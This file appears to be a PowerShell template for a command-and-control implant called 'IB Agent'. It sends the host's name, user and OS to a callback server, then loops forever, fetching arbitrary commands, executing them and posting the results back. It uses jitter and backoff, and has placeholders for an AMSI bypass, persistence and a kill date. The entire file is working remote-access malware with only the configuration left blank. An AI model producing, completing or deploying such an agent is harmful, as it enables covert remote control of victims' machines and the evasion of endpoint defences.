# IB Agent — PowerShell
$CB = "[CALLBACK]"
$Freq = [FREQ]
$Jitter = [JITTER]
$RetryMax = [RETRY_MAX]
$Label = "[LABEL]"
[PROXY_SETUP]
[AMSI_BYPASS]
$body = @{hostname=$env:COMPUTERNAME; username=$env:USERNAME; os_info=(Get-CimInstance Win32_OperatingSystem).Caption; script=$Label} | ConvertTo-Json
$resp = Invoke-RestMethod -Uri "$CB/agent/checkin" -Method Post -Body $body -ContentType 'application/json'
$agentId = $resp.agent_id
if (-not $agentId) { exit 1 }
[PERSIST_CODE]
$_backoff = 1
while ($true) {
    [KILLDATE_CHECK]
    try {
        $r = Invoke-WebRequest -Uri "$CB/agent/cmd/$agentId" -UseBasicParsing -ErrorAction Stop
        if ($r.StatusCode -eq 200) {
            $_backoff = 1
            $d = $r.Content | ConvertFrom-Json
            $out = try { & ([scriptblock]::Create($d.command)) 2>&1 | Out-String } catch { $_.Exception.Message }
            Invoke-RestMethod -Uri "$CB/agent/res/$($d.id)" -Method Post -Body $out -ContentType 'text/plain' | Out-Null
        }
    } catch {
        if ($RetryMax -gt 1 -and $_backoff -lt $RetryMax) { $_backoff++ }
    }
    $s = $Freq * $_backoff
    if ($Jitter -gt 0) { $s += Get-Random -Minimum (-$s*$Jitter/100) -Maximum ($s*$Jitter/100); $s = [math]::Max(1,$s) }
    Start-Sleep -Seconds $s
}
